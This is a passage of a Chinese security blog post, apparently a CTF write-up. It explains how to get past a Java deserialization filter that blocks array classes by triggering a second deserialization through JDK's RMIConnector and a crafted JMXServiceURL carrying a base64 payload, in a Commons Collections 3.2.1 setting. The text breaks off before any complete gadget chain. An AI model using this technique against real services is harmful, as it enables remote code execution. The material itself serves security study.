<!DOCTYPE html>
<html lang="en-us">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> 使用二次反序列化构造完全不含数组的Gadget | Hello World</title>
  <link rel = 'canonical' href = 'https://bikeknight.top/posts/%E4%BD%BF%E7%94%A8%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%84%E9%80%A0%E5%AE%8C%E5%85%A8%E4%B8%8D%E5%90%AB%E6%95%B0%E7%BB%84%E7%9A%84gadget/'>
  <meta name="description" content="Do not go gentle into that good night.">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="使用二次反序列化构造完全不含数组的Gadget" />
<meta property="og:description" content="昨天碰到了这样一个题，有一个反序列化的接口，但是使用了自定义的MyObjectInputStream进行反序列化：
public class MyObjectInputStream extends ObjectInputStream {  private ClassLoader classLoader;   public MyObjectInputStream(InputStream inputStream) throws Exception {  super(inputStream);  URL[] urls = ((URLClassLoader) Transformer.class.getClassLoader()).getURLs();  this.classLoader = new URLClassLoader(urls);  }   protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {  Class clazz = this.classLoader.loadClass(desc.getName());  return clazz;  } } 它重写了父类的resolveClass方法，使用loadClass()方法根据类名获取相应的Class对象，而父类默认使用Class.forName()进行这一过程，这两者最大的区别就是loadClass()方法没法加载任何数组类型的对象：
Class.forName(&#34;[[B&#34;);	// class [[B ClassLoader.getSystemClassLoader().loadClass(&#34;[[B&#34;);	// ClassNotFoundException 这道题其实就是shiro-550的pro版本，在shiro环境下也有数组的限制，不过区别在于：
 shiro环境下只能加载Java原生类的数组对象 这道题不能加载任何数组对象  关于第一点的具体原因，可以参考P牛的小密圈，这里不再赘述。这道题的依赖是CC3.2.1，CC链的触发方法有两个：
 Transformer数组的链式调用 TeamplatesImpl动态加载字节码  第一个不必多说，第二个加载的_bytecodes字段是byte[][]类型的，也会涉及到数组类型对象的加载，所以这道题使用原生CC链是无法解出的。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bikeknight.top/posts/%E4%BD%BF%E7%94%A8%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%84%E9%80%A0%E5%AE%8C%E5%85%A8%E4%B8%8D%E5%90%AB%E6%95%B0%E7%BB%84%E7%9A%84gadget/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-03-14T08:27:22+08:00" />
<meta property="article:modified_time" content="2022-03-14T08:27:22+08:00" />


  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="使用二次反序列化构造完全不含数组的Gadget"/>
<meta name="twitter:description" content="昨天碰到了这样一个题，有一个反序列化的接口，但是使用了自定义的MyObjectInputStream进行反序列化：
public class MyObjectInputStream extends ObjectInputStream {  private ClassLoader classLoader;   public MyObjectInputStream(InputStream inputStream) throws Exception {  super(inputStream);  URL[] urls = ((URLClassLoader) Transformer.class.getClassLoader()).getURLs();  this.classLoader = new URLClassLoader(urls);  }   protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {  Class clazz = this.classLoader.loadClass(desc.getName());  return clazz;  } } 它重写了父类的resolveClass方法，使用loadClass()方法根据类名获取相应的Class对象，而父类默认使用Class.forName()进行这一过程，这两者最大的区别就是loadClass()方法没法加载任何数组类型的对象：
Class.forName(&#34;[[B&#34;);	// class [[B ClassLoader.getSystemClassLoader().loadClass(&#34;[[B&#34;);	// ClassNotFoundException 这道题其实就是shiro-550的pro版本，在shiro环境下也有数组的限制，不过区别在于：
 shiro环境下只能加载Java原生类的数组对象 这道题不能加载任何数组对象  关于第一点的具体原因，可以参考P牛的小密圈，这里不再赘述。这道题的依赖是CC3.2.1，CC链的触发方法有两个：
 Transformer数组的链式调用 TeamplatesImpl动态加载字节码  第一个不必多说，第二个加载的_bytecodes字段是byte[][]类型的，也会涉及到数组类型对象的加载，所以这道题使用原生CC链是无法解出的。"/>

  
  
    
  
  
  <link rel="stylesheet" href="https://bikeknight.top/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://bikeknight.top/images/favicon.ico" />

  
  
  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">All posts</a></li>
         
        <li><a href="/tags">Tags</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://bikeknight.top/posts/shortenromelength/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://bikeknight.top/posts/buildtomcatsourcewithidea/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&text=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&title=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&is_video=false&description=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget&body=Check out this article: https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&title=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&title=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&name=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget&description=%e6%98%a8%e5%a4%a9%e7%a2%b0%e5%88%b0%e4%ba%86%e8%bf%99%e6%a0%b7%e4%b8%80%e4%b8%aa%e9%a2%98%ef%bc%8c%e6%9c%89%e4%b8%80%e4%b8%aa%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e6%8e%a5%e5%8f%a3%ef%bc%8c%e4%bd%86%e6%98%af%e4%bd%bf%e7%94%a8%e4%ba%86%e8%87%aa%e5%ae%9a%e4%b9%89%e7%9a%84MyObjectInputStream%e8%bf%9b%e8%a1%8c%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%ef%bc%9a%0apublic%20class%20MyObjectInputStream%20extends%20ObjectInputStream%20%7b%20%20private%20ClassLoader%20classLoader%3b%20%20%20public%20MyObjectInputStream%28InputStream%20inputStream%29%20throws%20Exception%20%7b%20%20super%28inputStream%29%3b%20%20URL%5b%5d%20urls%20%3d%20%28%28URLClassLoader%29%20Transformer.class.getClassLoader%28%29%29.getURLs%28%29%3b%20%20this.classLoader%20%3d%20new%20URLClassLoader%28urls%29%3b%20%20%7d%20%20%20protected%20Class%26lt%3b%3f%26gt%3b%20resolveClass%28ObjectStreamClass%20desc%29%20throws%20IOException%2c%20ClassNotFoundException%20%7b%20%20Class%20clazz%20%3d%20this.classLoader.loadClass%28desc.getName%28%29%29%3b%20%20return%20clazz%3b%20%20%7d%20%7d%20%e5%ae%83%e9%87%8d%e5%86%99%e4%ba%86%e7%88%b6%e7%b1%bb%e7%9a%84resolveClass%e6%96%b9%e6%b3%95%ef%bc%8c%e4%bd%bf%e7%94%a8loadClass%28%29%e6%96%b9%e6%b3%95%e6%a0%b9%e6%8d%ae%e7%b1%bb%e5%90%8d%e8%8e%b7%e5%8f%96%e7%9b%b8%e5%ba%94%e7%9a%84Class%e5%af%b9%e8%b1%a1%ef%bc%8c%e8%80%8c%e7%88%b6%e7%b1%bb%e9%bb%98%e8%ae%a4%e4%bd%bf%e7%94%a8Class.forName%28%29%e8%bf%9b%e8%a1%8c%e8%bf%99%e4%b8%80%e8%bf%87%e7%a8%8b%ef%bc%8c%e8%bf%99%e4%b8%a4%e8%80%85%e6%9c%80%e5%a4%a7%e7%9a%84%e5%8c%ba%e5%88%ab%e5%b0%b1%e6%98%afloadClass%28%29%e6%96%b9%e6%b3%95%e6%b2%a1%e6%b3%95%e5%8a%a0%e8%bd%bd%e4%bb%bb%e4%bd%95%e6%95%b0%e7%bb%84%e7%b1%bb%e5%9e%8b%e7%9a%84%e5%af%b9%e8%b1%a1%ef%bc%9a%0aClass.forName%28%26%2334%3b%5b%5bB%26%2334%3b%29%3b%09%2f%2f%20class%20%5b%5bB%20ClassLoader.getSystemClassLoader%28%29.loadClass%28%26%2334%3b%5b%5bB%26%2334%3b%29%3b%09%2f%2f%20ClassNotFoundException%20%e8%bf%99%e9%81%93%e9%a2%98%e5%85%b6%e5%ae%9e%e5%b0%b1%e6%98%afshiro-550%e7%9a%84pro%e7%89%88%e6%9c%ac%ef%bc%8c%e5%9c%a8shiro%e7%8e%af%e5%a2%83%e4%b8%8b%e4%b9%9f%e6%9c%89%e6%95%b0%e7%bb%84%e7%9a%84%e9%99%90%e5%88%b6%ef%bc%8c%e4%b8%8d%e8%bf%87%e5%8c%ba%e5%88%ab%e5%9c%a8%e4%ba%8e%ef%bc%9a%0a%20shiro%e7%8e%af%e5%a2%83%e4%b8%8b%e5%8f%aa%e8%83%bd%e5%8a%a0%e8%bd%bdJava%e5%8e%9f%e7%94%9f%e7%b1%bb%e7%9a%84%e6%95%b0%e7%bb%84%e5%af%b9%e8%b1%a1%20%e8%bf%99%e9%81%93%e9%a2%98%e4%b8%8d%e8%83%bd%e5%8a%a0%e8%bd%bd%e4%bb%bb%e4%bd%95%e6%95%b0%e7%bb%84%e5%af%b9%e8%b1%a1%20%20%e5%85%b3%e4%ba%8e%e7%ac%ac%e4%b8%80%e7%82%b9%e7%9a%84%e5%85%b7%e4%bd%93%e5%8e%9f%e5%9b%a0%ef%bc%8c%e5%8f%af%e4%bb%a5%e5%8f%82%e8%80%83P%e7%89%9b%e7%9a%84%e5%b0%8f%e5%af%86%e5%9c%88%ef%bc%8c%e8%bf%99%e9%87%8c%e4%b8%8d%e5%86%8d%e8%b5%98%e8%bf%b0%e3%80%82%e8%bf%99%e9%81%93%e9%a2%98%e7%9a%84%e4%be%9d%e8%b5%96%e6%98%afCC3.2.1%ef%bc%8cCC%e9%93%be%e7%9a%84%e8%a7%a6%e5%8f%91%e6%96%b9%e6%b3%95%e6%9c%89%e4%b8%a4%e4%b8%aa%ef%bc%9a%0a%20Transformer%e6%95%b0%e7%bb%84%e7%9a%84%e9%93%be%e5%bc%8f%e8%b0%83%e7%94%a8%20TeamplatesImpl%e5%8a%a8%e6%80%81%e5%8a%a0%e8%bd%bd%e5%ad%97%e8%8a%82%e7%a0%81%20%20%e7%ac%ac%e4%b8%80%e4%b8%aa%e4%b8%8d%e5%bf%85%e5%a4%9a%e8%af%b4%ef%bc%8c%e7%ac%ac%e4%ba%8c%e4%b8%aa%e5%8a%a0%e8%bd%bd%e7%9a%84_bytecodes%e5%ad%97%e6%ae%b5%e6%98%afbyte%5b%5d%5b%5d%e7%b1%bb%e5%9e%8b%e7%9a%84%ef%bc%8c%e4%b9%9f%e4%bc%9a%e6%b6%89%e5%8f%8a%e5%88%b0%e6%95%b0%e7%bb%84%e7%b1%bb%e5%9e%8b%e5%af%b9%e8%b1%a1%e7%9a%84%e5%8a%a0%e8%bd%bd%ef%bc%8c%e6%89%80%e4%bb%a5%e8%bf%99%e9%81%93%e9%a2%98%e4%bd%bf%e7%94%a8%e5%8e%9f%e7%94%9fCC%e9%93%be%e6%98%af%e6%97%a0%e6%b3%95%e8%a7%a3%e5%87%ba%e7%9a%84%e3%80%82" aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbikeknight.top%2fposts%2f%25E4%25BD%25BF%25E7%2594%25A8%25E4%25BA%258C%25E6%25AC%25A1%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%259E%2584%25E9%2580%25A0%25E5%25AE%258C%25E5%2585%25A8%25E4%25B8%258D%25E5%2590%25AB%25E6%2595%25B0%25E7%25BB%2584%25E7%259A%2584gadget%2f&t=%e4%bd%bf%e7%94%a8%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0%e5%ae%8c%e5%85%a8%e4%b8%8d%e5%90%ab%e6%95%b0%e7%bb%84%e7%9a%84Gadget" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents"></nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        使用二次反序列化构造完全不含数组的Gadget
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2022-03-14 08:27:22 &#43;0800 CST" itemprop="datePublished">2022-03-14</time>
          
        </div>
        
        
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/java%E5%AE%89%E5%85%A8" rel="tag">Java安全</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <p>昨天碰到了这样一个题，有一个反序列化的接口，但是使用了自定义的<code>MyObjectInputStream</code>进行反序列化：</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">MyObjectInputStream</span> <span style="color:#6ab825;font-weight:bold">extends</span> ObjectInputStream {
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">private</span> ClassLoader classLoader;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#447fcf">MyObjectInputStream</span>(InputStream inputStream) <span style="color:#6ab825;font-weight:bold">throws</span> Exception {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">super</span>(inputStream);
</span></span><span style="display:flex;"><span>        URL[] urls = ((URLClassLoader) Transformer.<span style="color:#bbb">class</span>.<span style="color:#bbb">getClassLoader</span>()).<span style="color:#bbb">getURLs</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">this</span>.<span style="color:#bbb">classLoader</span> = <span style="color:#6ab825;font-weight:bold">new</span> URLClassLoader(urls);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span style="color:#6ab825;font-weight:bold">throws</span> IOException, ClassNotFoundException {
</span></span><span style="display:flex;"><span>        Class clazz = <span style="color:#6ab825;font-weight:bold">this</span>.<span style="color:#bbb">classLoader</span>.<span style="color:#bbb">loadClass</span>(desc.<span style="color:#bbb">getName</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>它重写了父类的<code>resolveClass</code>方法，使用<code>loadClass()</code>方法根据类名获取相应的<code>Class</code>对象，而父类默认使用<code>Class.forName()</code>进行这一过程，这两者最大的区别就是<code>loadClass()</code>方法没法加载任何数组类型的对象：</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Class.<span style="color:#bbb">forName</span>(<span style="color:#ed9d13">&#34;[[B&#34;</span>);	<span style="color:#999;font-style:italic">// class [[B
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>ClassLoader.<span style="color:#bbb">getSystemClassLoader</span>().<span style="color:#bbb">loadClass</span>(<span style="color:#ed9d13">&#34;[[B&#34;</span>);	<span style="color:#999;font-style:italic">// ClassNotFoundException
</span></span></span></code></pre></div><p>这道题其实就是shiro-550的pro版本，在shiro环境下也有数组的限制，不过区别在于：</p>
<ul>
<li>shiro环境下只能加载Java原生类的数组对象</li>
<li>这道题不能加载任何数组对象</li>
</ul>
<p>关于第一点的具体原因，可以参考P牛的小密圈，这里不再赘述。这道题的依赖是<code>CC3.2.1</code>，CC链的触发方法有两个：</p>
<ul>
<li><code>Transformer</code>数组的链式调用</li>
<li><code>TeamplatesImpl</code>动态加载字节码</li>
</ul>
<p>第一个不必多说，第二个加载的<code>_bytecodes</code>字段是<code>byte[][]</code>类型的，也会涉及到数组类型对象的加载，所以这道题使用原生CC链是无法解出的。</p>
<p>破局的方法就是利用二次反序列化，所谓二次反序列化，一言以蔽之：在反序列化A的过程中又会触发一次反序列化，第二次反序列化的对象B才是我们真正的exploit对象。</p>
<p><code>JDK</code>自带了<code>javax.management.remote.rmi.RMIConnector</code>这个类，其<code>findRMIServerJRMP</code>方法：</p>
<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20220314090528716.png" alt="image-20220314090528716"></p>
<p>会将base64数据解码之后使用原生<code>ObjectInputStream</code>直接反序列化，如果可以控制base64数据，这里就可以作为一个二次反序列化的触发点。</p>
<p>借助IDEA的find usage功能，我们可以发现存在这样的调用链：</p>
<pre tabindex="0"><code>connect() --&gt;
	connect(Map environment) --&gt;
		findRMIServer() --&gt;
			findRMIServerJRMP() --&gt; readObject()
</code></pre><p>借助<code>connect()</code>方法，我们可以触发二次反序列化，不过我们还要控制base64编码的数据，在<code>RMIConnector</code>的构造方法中会传入一个<code>JMXServiceURL</code>类型的URL，<code>findRMIServer()</code>方法中会对这个URL进行分割，获取<code>/stub/</code>之后的部分，传入<code>findRMIServerJRMP()</code>方法中：</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">private</span> RMIServer <span style="color:#447fcf">findRmiServer</span>(JMXServiceURL directoryURL ......) {
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">final</span> <span style="color:#6ab825;font-weight:bold">boolean</span> isIiop = RMIConnectorServer.<span style="color:#bbb">isIiopURL</span>(directoryURL,<span style="color:#6ab825;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (isIiop) {
</span></span><span style="display:flex;"><span>            <span style="color:#999;font-style:italic">// Make sure java.naming.corba.orb is in the Map.
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>            environment.<span style="color:#bbb">put</span>(EnvHelp.<span style="color:#bbb">DEFAULT_ORB</span>,resolveOrb(environment));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        String path = directoryURL.<span style="color:#bbb">getURLPath</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">int</span> end = path.<span style="color:#bbb">indexOf</span>(<span style="color:#ed9d13">&#39;;&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (end &lt; 0) end = path.<span style="color:#bbb">length</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (path.<span style="color:#bbb">startsWith</span>(<span style="color:#ed9d13">&#34;/jndi/&#34;</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">return</span> findRMIServerJNDI(path.<span style="color:#bbb">substring</span>(6,end), environment, isIiop);
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">else</span> <span style="color:#6ab825;font-weight:bold">if</span> (path.<span style="color:#bbb">startsWith</span>(<span style="color:#ed9d13">&#34;/stub/&#34;</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">return</span> findRMIServerJRMP(path.<span style="color:#bbb">substring</span>(6,end), environment, isIiop);
</span></span><span style="display:flex;"><span>    	<span style="color:#999;font-style:italic">//...
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>} 
</span></span></code></pre></div><p><code>JXMServiceURL</code>符合<code>service:jmx:protocol:sap</code>这个规范，我们只需要构造这样一个URL即可：</p>
<pre tabindex="0"><code>service:jmx:(iiop|rmi)://127.0.0.1:8000/stub/{$payload}
</code></pre><p>那么如何触发<code>connect()</code>方法呢？这个方法的修饰符是<code>public</code>，所以我们可以借助 <code>InvokerTransformer</code>：</p>
